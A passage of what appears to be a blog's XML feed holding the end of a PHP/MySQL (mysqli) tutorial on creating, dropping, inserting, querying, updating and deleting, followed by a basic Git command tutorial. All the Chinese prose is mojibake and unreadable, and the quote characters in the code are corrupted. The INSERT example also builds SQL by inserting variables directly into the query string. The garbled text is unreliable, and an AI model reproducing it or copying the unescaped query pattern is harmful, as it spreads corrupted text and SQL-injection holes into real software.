<p>åœ¨ä½¿ç”¨PHPè„šæœ¬åˆ é™¤æ•°æ®åº“æ—¶ï¼Œä¸ä¼šå‡ºç°ç¡®è®¤æ˜¯å¦åˆ é™¤ä¿¡æ¯ï¼Œä¼šç›´æ¥åˆ é™¤æŒ‡å®šæ•°æ®åº“ï¼Œæ‰€ä»¥ä½ åœ¨åˆ é™¤æ•°æ®åº“æ—¶è¦ç‰¹åˆ«å°å¿ƒã€‚åƒä¸‡å°å¿ƒã€‚</p>
<h5 id="é€‰æ‹©æ•°æ®åº“"><a href="#é€‰æ‹©æ•°æ®åº“" class="headerlink" title="é€‰æ‹©æ•°æ®åº“"></a>é€‰æ‹©æ•°æ®åº“</h5><p>è¯­å¥ï¼š<strong>mysqli_select_db($conn,â€™aaâ€™);</strong><br>aaæ˜¯æŒ‡ä½ é€‰æ‹©çš„æ•°æ®åº“åå­—ï¼Œè¿™ä¸ªæ“ä½œç®€å•ï¼Œä¸æ¼”ç¤ºäº†ã€‚</p>
<h5 id="åˆ›å»ºæ•°æ®è¡¨"><a href="#åˆ›å»ºæ•°æ®è¡¨" class="headerlink" title="åˆ›å»ºæ•°æ®è¡¨"></a>åˆ›å»ºæ•°æ®è¡¨</h5><p>è¯­å¥ï¼š</p>
<p><strong>$s</strong>ql=â€CREATE TABLE bb_1(â€œ.**<br><strong>â€œbb_id INT NOT NULL AUTO_INCREMENT,â€.</strong><br><strong>â€œbb_title VARCHAR(100) NOT NULL,â€.</strong><br><strong>â€œbb_name VARCHAR(40) NOT NULL,â€.</strong><br><strong>â€œbb_data DATE, â€œ.</strong><br>â€œPRIMARY KEY(bb_id))ENGINE=InnoDB DEFAULT CHARSET=utf8;â€;**</p>
<p>ä¸€å®šè¦çœ‹æ¸…æ¥šæ‹¬å·å’Œ, .;ä¸è¦å°‘ä¸€ä¸ªå¤šä¸€ä¸ªï¼Œ</p>
<p>PRIMARY KEY(bb_id)ä¸»é”®æ˜¯Id</p>
<p>AUTO_INCREMENTçš„æ„æ€æ˜¯è‡ªå·±å¢åŠ ï¼Œidè‡ªå·±å¢åŠ ï¼Œè¿™æ ·æ–¹ä¾¿ä¸€ç‚¹ã€‚</p>
<p>ENGINE=InnoDB è¡¨ç¤ºå°†æ•°æ®åº“çš„å¼•æ“è®¾ç½®ä¸ºInnoDB,ä»MySQL 5.6å¼€å§‹é»˜è®¤ä½¿ç”¨è¯¥å¼•æ“ã€‚</p>
<p>DEFAULT CHARSET=utf8 è¡¨ç¤ºè®¾ç½®æ•°æ®åº“çš„é»˜è®¤å­—ç¬¦é›†ä¸ºutf8</p>
<h5 id="åˆ é™¤æ•°æ®è¡¨"><a href="#åˆ é™¤æ•°æ®è¡¨" class="headerlink" title="åˆ é™¤æ•°æ®è¡¨"></a>åˆ é™¤æ•°æ®è¡¨</h5><p><strong>è¯­å¥ï¼š$sql=â€DROP TABLE bb_1â€;</strong></p>
<p> <strong>mysqli_select_db($conn,â€™aaâ€™);</strong></p>
<p>ä¸€å®šä¸è¦å¿˜è®°å†™è¿™ä¸€å¥mysqli_select_db($conn,â€™aaâ€™);</p>
<p>è¿™ä¸€å¥çš„æ„æ€æ˜¯è¯´åœ¨è¿™ä¸ªaaæ•°æ®åº“é‡Œé¢åˆ é™¤bb_1çš„æ•°æ®è¡¨ã€‚</p>
<h5 id="åœ¨æ•°æ®è¡¨é‡Œé¢æ’å…¥æ•°æ®"><a href="#åœ¨æ•°æ®è¡¨é‡Œé¢æ’å…¥æ•°æ®" class="headerlink" title="åœ¨æ•°æ®è¡¨é‡Œé¢æ’å…¥æ•°æ®"></a>åœ¨æ•°æ®è¡¨é‡Œé¢æ’å…¥æ•°æ®</h5><p>è¯­å¥ï¼š</p>
<p><strong>$sql=â€INSERT INTO bb_1â€.</strong></p>
<p> <strong>â€œ(bb_title,bb_name,bb_data)â€.</strong><br><strong>â€‹<br>â€‹ â€œVALUESâ€.</strong><br><strong>â€‹<br>â€‹ â€œ(â€˜$bb_titleâ€™,â€™$bb_nameâ€™,â€™$bb_dataâ€™)â€;</strong><br>â€‹<br>â€‹ å¯ä»¥å¤šæ’å…¥å‡ æ¡æ•°æ®ï¼Œä¸€æ ·çš„å½¢å¼ï¼Œä¿®æ”¹æ•°æ®å°±å¥½äº†ã€‚<br>â€‹<br>â€‹ ç„¶åå°±å¯ä»¥åœ¨ä½ çš„æ•°æ®åº“é‡Œé¢çœ‹åˆ°è¿™äº›æ•°æ®äº†ã€‚<br>â€‹<br>â€‹<br>â€‹<br>â€‹</p>
<h5 id="æŸ¥è¯¢æ•°æ®1-1"><a href="#æŸ¥è¯¢æ•°æ®1-1" class="headerlink" title="æŸ¥è¯¢æ•°æ®1.1"></a>æŸ¥è¯¢æ•°æ®1.1</h5><p>è¯­å¥ï¼š <strong>$sql=â€™SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1â€™;</strong></p>
<p>bb_id,bb_title,bb_name,bb_dataéƒ½æ˜¯å­—æ®µ</p>
<p>bb_1æ˜¯æ•°æ®è¡¨åã€‚</p>
<p>ä¸€å®šè¦æ³¨æ„æ‹¬å·ä¸€å¯¹ä¸€å¯¹çš„å†™ï¼Œä¸è¦å¿˜è®°htmlä»£ç çš„è¿ç»­æ€§ã€‚</p>
<p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒPHP mysqli_fetch_array() å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ä¸º <strong>MYSQLI_ASSOC</strong>ï¼Œ<br>è®¾ç½®è¯¥å‚æ•°æŸ¥è¯¢ç»“æœè¿”å›<strong>å…³è”æ•°ç»„</strong></p>
<p>PHP æä¾›äº†å¦å¤–ä¸€ä¸ªå‡½æ•° <strong>mysqli_fetch_assoc()</strong>, è¯¥å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ã€‚<br>è¿”å›æ ¹æ®ä»ç»“æœé›†å–å¾—çš„è¡Œç”Ÿæˆçš„å…³è”æ•°ç»„ï¼Œå¦‚æœæ²¡æœ‰æ›´å¤šè¡Œï¼Œåˆ™è¿”å› falseã€‚</p>
<p>åœ¨æˆ‘ä»¬æ‰§è¡Œå®Œ SELECT è¯­å¥åï¼Œé‡Šæ”¾æ¸¸æ ‡å†…å­˜æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¹ æƒ¯ã€‚</p>
<p>å¯ä»¥é€šè¿‡ PHP å‡½æ•° mysqli_free_result() æ¥å®ç°å†…å­˜çš„é‡Šæ”¾ã€‚</p>
<p>æ¸¸æ ‡å†…å­˜ï¼šå­˜å‚¨Selectçš„æŸ¥è¯¢ç»“æœï¼Œå¹¶ç”¨æ¥éå†ã€‚</p>
<h5 id="æŸ¥è¯¢æ•°æ®1-2"><a href="#æŸ¥è¯¢æ•°æ®1-2" class="headerlink" title="æŸ¥è¯¢æ•°æ®1.2"></a>æŸ¥è¯¢æ•°æ®1.2</h5><p>è¯­å¥ï¼š**$sql=â€™SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1 WHERE bb_id=â€2â€â€˜;**</p>
<p>WHEREç›¸å½“äºä¸€ä¸ªé™åˆ¶æ¡ä»¶ã€‚æ¯”å¦‚è¿™é‡Œé¢çš„åªèƒ½æ˜¯id ä¸º2çš„æ•°æ®è¢«æŸ¥å‡ºæ¥ã€‚</p>
<h5 id="æŸ¥è¯¢æ•°æ®1-3"><a href="#æŸ¥è¯¢æ•°æ®1-3" class="headerlink" title="æŸ¥è¯¢æ•°æ®1.3"></a>æŸ¥è¯¢æ•°æ®1.3</h5><p>æ¨¡ç³ŠæŸ¥è¯¢</p>
<p>LIKEçš„ä½¿ç”¨ã€‚</p>
<p>è¯­å¥ï¼š</p>
<p><strong>$sql=â€™SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1</strong><br><strong>WHERE bb_name LIKE â€œ%å­¦ä¹ â€â€˜;</strong></p>
<p>è¿˜æœ‰ä¸€äº›ç”¨æ³•</p>
<p>â€˜%aâ€™ //ä»¥aç»“å°¾çš„æ•°æ®</p>
<p>â€˜a%â€™ //ä»¥aå¼€å¤´çš„æ•°æ®</p>
<p>â€˜%a%â€™ //å«æœ‰açš„æ•°æ®</p>
<p>â€˜<em>a</em>â€˜ //ä¸‰ä½ä¸”ä¸­é—´å­—æ¯æ˜¯açš„</p>
<p>â€˜<em>_aâ€™ //ä¸¤ä½ä¸”ç»“å°¾å­—æ¯æ˜¯açš„</em></p>
<p>â€˜a_â€™ //ä¸¤ä½ä¸”å¼€å¤´å­—æ¯æ˜¯açš„</p>
<h5 id="æŸ¥è¯¢æ•°æ®1-3-1"><a href="#æŸ¥è¯¢æ•°æ®1-3-1" class="headerlink" title="æŸ¥è¯¢æ•°æ®1.3"></a>æŸ¥è¯¢æ•°æ®1.3</h5><p>è¯­å¥ï¼š</p>
<p><strong>$sql=â€™SELECT bb_id,bb_title,bb_name,bb_data</strong><br><strong>FROM bb_1</strong><br><strong>ORDER BY bb_data ASCâ€™;</strong></p>
<p>æŒ‰ç…§æ—¶é—´çš„é¡ºåºæ’åºã€‚è¾“å‡ºã€‚</p>
<p>å…¶ä»–çš„å’Œæ•°æ®æµ‹è¯•çš„ä¸€æ ·ã€‚</p>
<h5 id="ä¿®æ”¹æ•°æ®"><a href="#ä¿®æ”¹æ•°æ®" class="headerlink" title="ä¿®æ”¹æ•°æ®"></a>ä¿®æ”¹æ•°æ®</h5><p>è¯­å¥ï¼š</p>
<p><strong>$sql=â€™UPDATE bb_1</strong><br><strong>SET bb_name=â€è°å‘€â€</strong><br><strong>WHERE bb_id=2â€™;</strong></p>
<p>WHEREæ˜¯ä¸€ä¸ªé™åˆ¶æ¡ä»¶ï¼›</p>
<p>å¯ä»¥è¿™æ ·ç†è§£ï¼šupdate è¡¨åç§° set åˆ—åç§° = æ–°å€¼ where æ›´æ–°æ¡ä»¶;</p>
<h5 id="åˆ é™¤æ•°æ®"><a href="#åˆ é™¤æ•°æ®" class="headerlink" title="åˆ é™¤æ•°æ®"></a>åˆ é™¤æ•°æ®</h5><p>è¯­å¥ï¼š</p>
<p><strong>$sql=â€™DELETE FROM bb_1</strong><br><strong>WHERE bb_id=3â€™;</strong></p>
<p>deleteï¼Œdropï¼Œtruncate éƒ½æœ‰åˆ é™¤è¡¨çš„ä½œç”¨ï¼ŒåŒºåˆ«åœ¨äºï¼š</p>
<ul>
<li>1ã€delete å’Œ truncate ä»…ä»…åˆ é™¤è¡¨æ•°æ®ï¼Œdrop è¿è¡¨æ•°æ®å’Œè¡¨ç»“æ„ä¸€èµ·åˆ é™¤ï¼Œæ‰“ä¸ªæ¯”</li>
<li>æ–¹ï¼Œdelete æ˜¯å•æ€ï¼Œtruncate æ˜¯å›¢ç­ï¼Œdrop æ˜¯æŠŠç”µè„‘æ‘”äº†ã€‚</li>
<li>2ã€delete æ˜¯ DML è¯­å¥ï¼Œæ“ä½œå®Œä»¥åå¦‚æœæ²¡æœ‰ä¸æƒ³æäº¤äº‹åŠ¡è¿˜å¯ä»¥å›æ»šï¼Œtruncate å’Œ</li>
<li>drop æ˜¯ DDL è¯­å¥ï¼Œæ“ä½œå®Œé©¬ä¸Šç”Ÿæ•ˆï¼Œä¸èƒ½å›æ»šï¼Œæ‰“ä¸ªæ¯”æ–¹ï¼Œdelete æ˜¯å‘å¾®ä¿¡è¯´åˆ†æ‰‹ï¼Œ</li>
<li>åæ‚”è¿˜å¯ä»¥æ’¤å›ï¼Œtruncate å’Œ drop æ˜¯ç›´æ¥æ‰‡è€³å…‰è¯´æ»šï¼Œä¸èƒ½åæ‚”ã€‚</li>
<li>3ã€æ‰§è¡Œçš„é€Ÿåº¦ä¸Šï¼Œ<strong>drop&gt;truncate&gt;delete</strong>ï¼Œæ‰“ä¸ªæ¯”æ–¹ï¼Œdrop æ˜¯ç¥èˆŸç«ç®­ï¼Œtruncate</li>
<li>æ˜¯å’Œè°å·åŠ¨è½¦ï¼Œdelete æ˜¯è‡ªè¡Œè½¦ã€‚</li>
</ul>
<p>å¥½äº†ï¼Œåˆ°æ­¤ç»“æŸï¼Œæ„Ÿè°¢å¤§å®¶ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_37236745/article/details/78694768">https://blog.csdn.net/qq_37236745/article/details/78694768</a></p>
<p>å‚è€ƒï¼šèœé¸Ÿæ•™ç¨‹ã€‚</p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>GitåŸºç¡€æ•™ç¨‹</title>
    <url>/2018/11/20/Note/Git%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="GitåŸºç¡€æ•™ç¨‹"><a href="#GitåŸºç¡€æ•™ç¨‹" class="headerlink" title="GitåŸºç¡€æ•™ç¨‹"></a>GitåŸºç¡€æ•™ç¨‹</h1><p>Git æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œæœ€åˆç”±Linuxä¹‹çˆ¶Linus Torvaldsåˆ›ä½œï¼Œåæ‰˜ä»˜æ»¨é‡çº¯ä½œä¸ºè½¯ä»¶ç»´æŠ¤è€…ã€‚</p>
<p>è¯¦ç»†å†å²è§ç»´åŸº <a href="https://zh.wikipedia.org/wiki/Git">git wiki</a></p>
<a id="more"></a>

<h2 id="Gitçš„åŸºæœ¬åŠŸèƒ½"><a href="#Gitçš„åŸºæœ¬åŠŸèƒ½" class="headerlink" title="Gitçš„åŸºæœ¬åŠŸèƒ½"></a>Gitçš„åŸºæœ¬åŠŸèƒ½</h2><p><a href="https://study-resources-1256288674.cos.ap-chengdu.myqcloud.com/Git-mindMapping.png"><img src="https://study-resources-1256288674.cos.ap-chengdu.myqcloud.com/Git-mindMapping.png" alt="Gitè„‘å›¾"></a></p>
<h3 id="é¡¹ç›®ç®¡ç†"><a href="#é¡¹ç›®ç®¡ç†" class="headerlink" title="é¡¹ç›®ç®¡ç†"></a>é¡¹ç›®ç®¡ç†</h3><h4 id="åˆå§‹åŒ–é¡¹ç›®"><a href="#åˆå§‹åŒ–é¡¹ç›®" class="headerlink" title="åˆå§‹åŒ–é¡¹ç›®"></a>åˆå§‹åŒ–é¡¹ç›®</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•å†…ä½¿ç”¨æ­¤å‘½ä»¤å³å°†é¡¹ç›®åˆå§‹åŒ–ä¸ºä¸€ä¸ªgitä»“åº“</p>
<h4 id="ä¸‹è½½è¿œç¨‹é¡¹ç›®"><a href="#ä¸‹è½½è¿œç¨‹é¡¹ç›®" class="headerlink" title="ä¸‹è½½è¿œç¨‹é¡¹ç›®"></a>ä¸‹è½½è¿œç¨‹é¡¹ç›®</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone [option] URL [dirname]</span><br></pre></td></tr></table></figure>
<ul>
<li><code>[dirname]</code> è®¾ç½®æ–°å»ºç›®å½•çš„åå­—</li>
<li>option:<ul>
<li><code>-b &lt;branch&gt;</code> å…‹éš†æŒ‡å®šåˆ†æ”¯</li>
</ul>
</li>
</ul>
<h3 id="æäº¤ä¿®æ”¹"><a href="#æäº¤ä¿®æ”¹" class="headerlink" title="æäº¤ä¿®æ”¹"></a>æäº¤ä¿®æ”¹</h3><p>Git æœ‰ä¸€ä¸ªç”¨äºå­˜å‚¨ä¿®æ”¹çš„æš‚å­˜åŒºï¼Œæäº¤ä¸€æ¬¡ä¿®æ”¹çš„è¿‡ç¨‹é¦–å…ˆéœ€è¦æ·»åŠ æ–‡ä»¶åˆ°æš‚å­˜åŒºï¼Œç„¶åå†è¿›è¡Œæäº¤ï¼ˆcommitï¼‰ï¼Œå¹¶å¡«å†™æäº¤è®°å½•</p>
<h4 id="è·Ÿè¸ªæ–‡ä»¶-amp-amp-æ·»åŠ ä¿®æ”¹åˆ°æš‚å­˜åŒº"><a href="#è·Ÿè¸ªæ–‡ä»¶-amp-amp-æ·»åŠ ä¿®æ”¹åˆ°æš‚å­˜åŒº" class="headerlink" title="è·Ÿè¸ªæ–‡ä»¶ &amp;&amp; æ·»åŠ ä¿®æ”¹åˆ°æš‚å­˜åŒº"></a>è·Ÿè¸ªæ–‡ä»¶ &amp;&amp; æ·»åŠ ä¿®æ”¹åˆ°æš‚å­˜åŒº</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add FILE</span><br></pre></td></tr></table></figure>
<ul>
<li><code>FILE</code> éœ€è¦æ·»åŠ åˆ°æš‚å­˜åŒºçš„æ–‡ä»¶ï¼Œä½¿ç”¨<code>.</code>æ¥æŒ‡ä»£å·¥ä½œåŒºå…¨éƒ¨æ–‡ä»¶</li>
</ul>
<p>ç¬¬ä¸€æ¬¡æ·»åŠ çš„æ–‡ä»¶åœ¨ä¹‹å‰æ˜¯æœªè·Ÿè¸ªï¼ˆuntrackedï¼‰çš„çŠ¶æ€ï¼Œä½¿ç”¨å‘½ä»¤åä¼šè·Ÿè¸ªæ–‡ä»¶å¹¶å°†æ–‡ä»¶æ·»åŠ åˆ°æš‚å­˜åŒºï¼›</p>
<p>å·²å­˜åœ¨ä½†æ˜¯å‘ç”Ÿäº†ä¿®æ”¹çš„æ–‡ä»¶ä¼šæ·»åŠ è¿›æš‚å­˜åŒºã€‚</p>
<h4 id="æŸ¥çœ‹æš‚å­˜åŒºçŠ¶æ€"><a href="#æŸ¥çœ‹æš‚å­˜åŒºçŠ¶æ€" class="headerlink" title="æŸ¥çœ‹æš‚å­˜åŒºçŠ¶æ€"></a>æŸ¥çœ‹æš‚å­˜åŒºçŠ¶æ€</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status # æŸ¥çœ‹æš‚å­˜åŒºçŠ¶æ€</span><br><span class="line">git diff # æŸ¥çœ‹å·¥ä½œåŒºä¸æš‚å­˜åŒºçš„åŒºåˆ«</span><br></pre></td></tr></table></figure>
<p>git diffè‹¥æš‚å­˜åŒºæ— ä¿®æ”¹åˆ™æ˜¾ç¤ºä¸å½“å‰ç‰ˆæœ¬çš„åŒºåˆ«ï¼›ä¹Ÿå¯ä½¿ç”¨<code>git diff --cached</code>æ¥æŸ¥çœ‹ã€‚</p>
<h4 id="æäº¤æš‚å­˜åŒºåˆ°ç‰ˆæœ¬"><a href="#æäº¤æš‚å­˜åŒºåˆ°ç‰ˆæœ¬" class="headerlink" title="æäº¤æš‚å­˜åŒºåˆ°ç‰ˆæœ¬"></a>æäº¤æš‚å­˜åŒºåˆ°ç‰ˆæœ¬</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit [options]</span><br></pre></td></tr></table></figure>
<p>options:</p>
<ul>
<li><code>-a</code> æäº¤å…¨éƒ¨æœªæš‚å­˜çš„ä¿®æ”¹</li>
<li><code>-m MESSAGE</code> ä½¿ç”¨çŸ­å­—ç¬¦ä¸²ä½œä¸ºæäº¤è®°å½•ï¼Œä¸é€‚ç”¨æ­¤å‚æ•°åˆ™ä¼šè¿›å…¥ç³»ç»Ÿç¼–è¾‘å™¨ç¼–å†™commitè®°å½•</li>
<li><code>--amend</code> é‡æ–°æäº¤æœ€è¿‘ä¸€æ¬¡çš„ä¿®æ”¹è®°å½•</li>
</ul>
<h3 id="åˆ†æ”¯"><a href="#åˆ†æ”¯" class="headerlink" title="åˆ†æ”¯"></a>åˆ†æ”¯</h3><h4 id="åˆ†æ”¯ç®¡ç†"><a href="#åˆ†æ”¯ç®¡ç†" class="headerlink" title="åˆ†æ”¯ç®¡ç†"></a>åˆ†æ”¯ç®¡ç†</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch [options] [NAME]</span><br></pre></td></tr></table></figure>
<p>options:</p>
<ul>
<li><code>-a</code> æ˜¾ç¤ºæ‰€æœ‰åˆ†æ”¯ï¼ˆæœ¬åœ°å’Œè¿œç¨‹ï¼‰</li>
<li><code>-d</code> åˆ é™¤åˆ†æ”¯ï¼ˆå·²åˆå¹¶ï¼‰</li>
<li><code>-D</code> å¼ºåˆ¶åˆ é™¤åˆ†æ”¯</li>
<li><code>-v</code> æ˜¾ç¤ºæœ€è¿‘ä¸€æ¬¡æäº¤</li>
</ul>
<h4 id="æ£€å‡ºåˆ†æ”¯"><a href="#æ£€å‡ºåˆ†æ”¯" class="headerlink" title="æ£€å‡ºåˆ†æ”¯"></a>æ£€å‡ºåˆ†æ”¯</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout [options]</span><br></pre></td></tr></table></figure>
<p>æ£€å‡ºåˆ°æŒ‡å®šåˆ†æ”¯ï¼ˆåˆ‡æ¢åˆ†æ”¯ï¼‰ï¼ŒåŒæ—¶ä¼šæ’¤é”€å½“å‰åˆ†æ”¯ä¸Šæœªæäº¤çš„æ‰€æœ‰ä¿®æ”¹ï¼ˆå›é€€åˆ°å½“å‰åˆ†æ”¯çš„æœ€æ–°ç‰ˆæœ¬ï¼‰</p>
<p>options:</p>
<ul>
<li><code>&lt;file&gt;</code> æ’¤é”€æŸä¸ªæ–‡ä»¶çš„ä¿®æ”¹</li>
<li><code>[branch_name]</code> åˆ‡æ¢åˆ†æ”¯</li>
<li><code>-b [branch_name]</code>æ–°å»ºå¹¶åˆ‡æ¢åˆ†æ”¯</li>
<li><code>-b [branchname] [tagname]</code> åœ¨ç‰¹å®šæ ‡ç­¾ä¸‹åˆ›å»ºåˆ†æ”¯</li>
</ul>
<p>å¯ä»¥ä½¿ç”¨checkoutæ¥å¿«é€Ÿæ’¤é”€å½“å‰åˆ†æ”¯æ‰€æœ‰ä¿®æ”¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout .</span><br></pre></td></tr></table></figure>
<h4 id="åˆå¹¶åˆ†æ”¯"><a href="#åˆå¹¶åˆ†æ”¯" class="headerlink" title="åˆå¹¶åˆ†æ”¯"></a>åˆå¹¶åˆ†æ”¯</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git merge NAME # å°†æŒ‡å®šåˆ†æ”¯åˆå¹¶åˆ°å½“å‰åˆ†æ”¯</span><br></pre></td></tr></table></figure>
<h4 id="å¸¸ç”¨åˆ†æ”¯åç§°"><a href="#å¸¸ç”¨åˆ†æ”¯åç§°" class="headerlink" title="å¸¸ç”¨åˆ†æ”¯åç§°"></a>å¸¸ç”¨åˆ†æ”¯åç§°</h4><ul>
<li>master ä¸»åˆ†æ”¯ï¼Œç¨³å®šåˆ†æ”¯ï¼Œé»˜è®¤åˆ†æ”¯</li>
<li>dev å¼€å‘ç‰ˆæœ¬åˆ†æ”¯</li>
<li>fix#4 ä¿®å¤é—®é¢˜æ—¶çš„ä¸´æ—¶åˆ†æ”¯</li>
</ul>
<h3 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h3><p>Gitå¯ä»¥ç»™å†å²ä¸­çš„æŸä¸€ä¸ªæäº¤æ‰“ä¸Šæ ‡ç­¾ï¼Œä»¥ç¤ºé‡è¦</p>
<p>æ¯”è¾ƒæœ‰ä»£è¡¨æ€§çš„æ˜¯ç”¨æ¥æ ‡è®°å‘è¡¨ç»“ç‚¹ï¼ˆç‰ˆæœ¬å·ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag # åˆ—å‡ºæ ‡ç­¾</span><br><span class="line">git tag -l &#39;pattern&#39; # ç”¨ç‰¹å®šæ¨¡å¼æŸ¥æ‰¾æ ‡ç­¾</span><br><span class="line">git show TAG # æŸ¥çœ‹æ ‡ç­¾ä¿¡æ¯ä¸å¯¹åº”çš„æäº¤ä¿¡æ¯</span><br></pre></td></tr></table></figure>
<p>gitæ ‡ç­¾åˆ†ä¸º<strong>è½»é‡æ ‡ç­¾</strong>å’Œ<strong>é™„æ³¨æ ‡ç­¾</strong>ä¸¤ç§</p>
<h4 id="è½»é‡æ ‡ç­¾"><a href="#è½»é‡æ ‡ç­¾" class="headerlink" title="è½»é‡æ ‡ç­¾"></a>è½»é‡æ ‡ç­¾</h4><p>åƒä¸€ä¸ªä¸ä¼šæ”¹å˜çš„åˆ†æ”¯ï¼ˆbranchï¼‰- å®ƒåªæ˜¯ä¸€ä¸ªç‰¹å®šæäº¤çš„å¼•ç”¨ã€‚</p>
<h4 id="é™„æ³¨æ ‡ç­¾"><a href="#é™„æ³¨æ ‡ç­¾" class="headerlink" title="é™„æ³¨æ ‡ç­¾"></a>é™„æ³¨æ ‡ç­¾</h4><p>æ˜¯å­˜å‚¨åœ¨Gitæ•°æ®åº“ä¸­çš„ä¸€ä¸ªå®Œæ•´å¯¹è±¡ã€‚</p>
<p>å…¶ä¸­åŒ…å«ï¼š</p>
<ul>
<li>æ ‡ç­¾è€…çš„åå­—</li>
<li>ç”µå­é‚®ä»¶åœ°å€</li>
<li>æ—¥æœŸæ—¶é—´</li>
<li>æ ‡ç­¾ä¿¡æ¯</li>
</ul>
<p>å®ƒä»¬å¯ä»¥ä½¿ç”¨GPGç­¾åä¸éªŒè¯</p>
<hr>
<p>é€šå¸¸å»ºè®®åˆ›å»ºé™„æ³¨æ ‡ç­¾ï¼ˆä¿¡æ¯é‡å¤§ï¼‰ï¼Œä½†å¦‚æœä½ åªæ˜¯æƒ³ç”¨ä¸€ä¸ªä¸´æ—¶çš„æ ‡ç­¾ï¼Œï¼Œæˆ–è€…å› ä¸ºæŸäº›åŸå› ä¸è¦ä¿å­˜é‚£äº›ä¿¡æ¯ï¼Œå°±ä½¿ç”¨è½»é‡æ ‡ç­¾</p>
<h4 id="åˆ›å»ºæ ‡ç­¾"><a href="#åˆ›å»ºæ ‡ç­¾" class="headerlink" title="åˆ›å»ºæ ‡ç­¾"></a>åˆ›å»ºæ ‡ç­¾</h4><p><code>git tag -a &lt;tagname&gt; -m &#39;comment&#39;</code> åˆ›å»ºä¸€ä¸ªé™„æ³¨æ ‡ç­¾</p>
<ul>
<li><code>-m</code> é€‰é¡¹æŒ‡å®šäº†å°†ä¼šå­˜å‚¨åœ¨æ ‡ç­¾ä¸­çš„ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œgitå°†ä¼šè¿è¡Œç¼–è¾‘å™¨è¦æ±‚ä½ è¾“å…¥ä¿¡æ¯</li>
</ul>
<p><code>git tag &lt;tagname&gt;</code> åˆ›å»ºä¸€ä¸ªè½»é‡æ ‡ç­¾</p>
<p>ä¸éœ€è¦ä½¿ç”¨<code>-a</code>ã€<code>-s</code>æˆ–<code>-m</code>é€‰é¡¹ï¼Œåªéœ€è¦æä¾›æ ‡ç­¾åå­—</p>
<p>ä¸ºä¹‹å‰çš„æäº¤è¡¥å……æ ‡ç­¾</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag -a &lt;tagname&gt; &lt;id&gt;</span><br></pre></td></tr></table></figure>
<p>idä¸ºè¦è¡¥å……æ ‡ç­¾çš„æäº¤çš„æ ¡éªŒå’Œï¼ˆæˆ–éƒ¨åˆ†æ ¡éªŒå’Œï¼‰</p>
<h4 id="æ¨é€æ ‡ç­¾"><a href="#æ¨é€æ ‡ç­¾" class="headerlink" title="æ¨é€æ ‡ç­¾"></a>æ¨é€æ ‡ç­¾</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push &lt;remote&gt; &lt;tagname&gt;</span><br></pre></td></tr></table></figure>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>git push</code>å‘½ä»¤å¹¶ä¸ä¼šæ¨é€æ ‡ ç­¾åˆ°è¿œç¨‹ä»“åº“ã€‚åœ¨åˆ›å»ºå®Œæ ‡ç­¾åä½ å¿…é¡»æ˜¾å¼åœ°æ¨é€æ ‡ç­¾ï¼Œè¿‡ç¨‹å’Œæ¨é€è¿œç¨‹åˆ†æ”¯ä¸€æ ·</p>
<p>å¦‚æœæƒ³è¦ä¸€æ¬¡æ¨é€å¾ˆå¤šæ ‡ç­¾ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¸¦æœ‰<code>--tags</code>é€‰é¡¹çš„<code>git push</code>å‘½ä»¤ã€‚è¿™å°†ä¼šæŠŠæ‰€æœ‰ä¸åœ¨è¿œç¨‹ä»“åº“çš„æ ‡ç­¾å…¨éƒ¨æ¨é€åˆ°è¿œç¨‹ä»“åº“</p>
<h4 id="æ£€å‡ºæ ‡ç­¾"><a href="#æ£€å‡ºæ ‡ç­¾" class="headerlink" title="æ£€å‡ºæ ‡ç­¾"></a>æ£€å‡ºæ ‡ç­¾</h4><p>Git ä¸­å¹¶ä¸èƒ½çœŸçš„æ£€å‡ºä¸€ä¸ªæ ‡ç­¾ï¼Œå› ä¸ºå®ƒä»¬å¹¶ä¸èƒ½åƒåˆ†æ”¯ä¸€æ ·æ¥å›ç§»åŠ¨ã€‚å¦‚æœä½ æƒ³è¦å·¥ä½œç›®å½•ä¸ä»“åº“ä¸­ç‰¹å®šçš„æ ‡ç­¾ç‰ˆæœ¬å®Œå…¨ä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;branchname&gt; &lt;tagname&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™å°†ä¼šåœ¨ç‰¹å®šçš„æ ‡ç­¾ä¸Šåˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯</p>
